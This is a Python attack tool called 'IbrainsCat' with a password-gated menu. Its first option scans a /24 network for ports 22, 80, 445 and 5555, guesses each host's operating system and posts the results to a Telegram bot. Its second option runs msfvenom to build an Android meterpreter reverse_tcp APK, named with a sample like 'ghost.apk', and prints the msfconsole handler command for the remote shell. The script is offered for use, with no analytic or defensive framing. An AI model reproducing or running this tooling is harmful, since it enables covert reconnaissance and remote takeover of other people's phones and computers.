#!/usr/bin/env python3

import os
import socket
import threading
import requests
from time import sleep
from datetime import datetime

# === SETTINGS ===
bot_token = 'YOUR_BOT_TOKEN'
chat_id = 'YOUR_CHAT_ID'
payload_dir = f"{os.getenv('HOME')}/.ibrainscat/payloads"
log_dir = f"{os.getenv('HOME')}/.ibrainscat/logs"
os.makedirs(payload_dir, exist_ok=True)
os.makedirs(log_dir, exist_ok=True)

# === FUNCTIONS ===

def banner():
    os.system("clear")
    print("\033[1;32m")
    os.system("toilet -f big -F gay 'IbrainsCat'")
    print("\033[1;37mBuilt by Commander Ismail\n")

def login():
    os.system("clear")
    print("\033[1;31m🔐 ACCESS GATEWAY — IbrainsCat\033[0m")
    password = "ib999"
    attempt = input("Enter access key: ")
    if attempt != password:
        print("\033[1;31mAccess Denied. Intrusion Logged.\033[0m")
        exit()
    print("\033[1;32mAccess Granted. Welcome Commander Ismail.\033[0m")
    sleep(1)

def scan_host(ip, ports, results):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, port))
            open_ports.append(port)
            s.close()
        except:
            pass
    if open_ports:
        guess = "Unknown"
        if 5555 in open_ports:
            guess = "Android"
        elif 445 in open_ports:
            guess = "Windows"
        elif 22 in open_ports and 80 in open_ports:
            guess = "Linux"
        results.append(f"[+] {ip} | {guess} | Open: {', '.join(map(str, open_ports))}")

def send_report_to_telegram(message):
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        data = {'chat_id': chat_id, 'text': message}
        r = requests.post(url, data=data)
        if r.status_code == 200:
            print("\033[1;36m> Report sent to Telegram.\033[0m")
        else:
            print("\033[1;31m> Failed to send Telegram report.\033[0m")
    except Exception as e:
        print(f"\033[1;31m> Telegram Error: {e}\033[0m")

def recon():
    banner()
    target_base = input("Enter base IP (e.g. 192.168.1): ")
    codename = input("Enter mission codename (e.g. HomeScan): ")
    ports = [22, 80, 445, 5555]
    threads = []
    results = []

    print("\n\033[1;36m> Scanning network...\033[0m")

    for i in range(1, 255):
        ip = f"{target_base}.{i}"
        t = threading.Thread(target=scan_host, args=(ip, ports, results))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    log_file = f"{log_dir}/{codename}_{datetime.now().strftime('%d-%m-%Y_%H%M')}.txt"

    print("\n\033[1;32m> RESULTS:\033[0m")
    for res in results:
        print(res)

    with open(log_file, "w") as f:
        f.write("\n".join(results))

    print(f"\n\033[1;33m> LOG SAVED TO: {log_file}\033[0m")

    send_report_to_telegram(
        f"IbrainsCat Recon Complete:\nTarget: {codename}\n\n" + "\n".join(results)
    )

def payload_menu():
    os.system("clear")
    print("\033[1;32m")
    os.system("toilet -f term -F border 'Payload Builder'")
    print("\033[0m")

    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT: ")
    name = input("Payload name (e.g. ghost.apk): ")
    output = f"{payload_dir}/{name}"

    print("\n\033[1;36m> Generating payload...\033[0m\n")
    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {output}"
    os.system(cmd)

    print(f"\n\033[1;32m> Payload saved to: {output}\033[0m")
    print(f"\033[1;33m> To listen:\033[0m")
    print(f"\033[1;37mmsfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'\033[0m")

def main():
    login()
    banner()
    print("1. Recon Scan")
    print("2. Payload Builder")
    print("0. Exit")

    choice = input("\nChoose operation: ")
    if choice == "1":
        recon()
    elif choice == "2":
        payload_menu()
    else:
        print("Exiting.")
        exit()

if __name__ == "__main__":
    main()
